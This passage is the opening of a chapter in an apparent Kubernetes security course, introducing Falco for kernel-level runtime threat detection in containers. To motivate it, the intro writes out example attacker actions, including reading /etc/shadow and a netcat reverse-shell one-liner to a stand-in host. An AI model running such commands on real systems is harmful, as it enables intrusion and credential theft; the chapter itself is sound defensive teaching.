        <article class="chapter" id="ch29">
            <div class="chapter-intro">
            <h2 class="chapter-title">Chapter 29 · Falco — Runtime Threat Detection in Real-Time</h2>
            <p class="chapter-lead">Audit logs (Ch28) tell you <strong>what happened at the API level</strong>. But what happens INSIDE a running container? An attacker exec's into your Django pod and runs <code>cat /etc/shadow</code>. They spawn a reverse shell with <code>nc -e /bin/bash attacker.com 4444</code>. They download a crypto miner to <code>/tmp/</code>. None of this touches the Kubernetes API — audit logs see <strong>nothing</strong>. <strong>Falco</strong> (CNCF graduated, open-source) fills this gap by monitoring <strong>Linux kernel system calls</strong> in real time. It watches every process spawn, every file open, every network connection — and alerts when behavior matches a threat pattern. Where audit logs answer "who did what through the API?", Falco answers <strong>"what is happening RIGHT NOW inside my containers?"</strong></p>
                <div class="chapter-meta">
                    <span class="meta-tag">🟡 Intermediate</span>
                    <span class="meta-tag">⏱️ ~2 hours</span>
                    <span class="meta-tag">🦅 Falco</span>
                    <span class="meta-tag">🔍 Runtime Security</span>
                </div>
            </div><!-- /chapter-intro -->

            <div class="learning-objectives">
                <h4>🎯 What You'll Learn — Core-Level Mastery</h4>
                <ul>
                    <li>✅ <strong>Falco internals:</strong> How libsinsp/libscap capture syscalls, kernel module vs eBPF probe trade-offs, DaemonSet deployment model, and JSON alert format</li>
